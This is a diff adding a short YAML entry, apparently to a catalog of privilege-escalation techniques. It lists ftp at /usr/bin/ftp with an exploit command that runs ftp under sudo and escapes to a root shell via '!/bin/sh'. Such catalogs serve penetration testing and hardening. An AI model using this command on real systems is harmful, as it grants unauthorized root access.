@@ -1,0 +1,4 @@
+name: ftp
+binary_path: /usr/bin/ftp
+exploit_cmds:
+- sudo /usr/bin/ftp && !/bin/sh
